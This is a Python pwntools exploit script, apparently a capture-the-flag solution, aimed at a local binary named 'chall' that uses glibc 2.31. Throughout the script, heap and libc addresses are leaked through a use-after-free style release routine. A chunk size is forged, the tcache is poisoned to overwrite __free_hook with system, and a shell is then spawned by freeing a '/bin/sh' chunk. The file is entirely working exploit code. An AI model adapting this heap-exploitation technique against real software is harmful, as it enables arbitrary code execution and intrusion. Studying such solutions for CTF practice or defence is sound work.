from pwn import *

context(log_level='debug')
sh = process("chall")
e = ELF("libc-2.31.so")
gdb.attach(sh)

def make_unique(idx, data):
	sh.sendline('0')
	sh.sendlineafter('> ', data)
	sh.sendlineafter('> ', str(idx))
	sh.recvuntil('> ')

def release(idx, data):
	sh.sendline('1')
	sh.sendlineafter('> ', str(idx))
	ret = sh.recvuntil('> ')
	sh.sendline(data)
	sh.recvuntil('> ')
	return ret[:ret.find('\n')]

sh.recvuntil('> ')

for i in range(0, 0xc0):
	make_unique(i, str(i))

release(0, '\x00' * 7)
leak = release(1, '\x00' * 7)
heap_addr = u64(leak+'\x00\x00')
print(hex(heap_addr))

release(2, p64(heap_addr + 0x58)[:7])
make_unique(0xc0, "cons")
make_unique(0xc1, p16(0x501))
leak = release(3, '\x00' * 7)

libc_addr = u64(leak+'\x00\x00') - 0x1ebbe0
print(hex(libc_addr))

release(6, '\x00' * 7)
release(7, p64(libc_addr + e.symbols["__free_hook"])[:7])

make_unique(0xc2, "/bin/sh")
make_unique(0xc3, p64(libc_addr + e.symbols["system"])[:7])

sh.sendline('1')
sh.sendlineafter('> ', str(0xc2))

sh.interactive()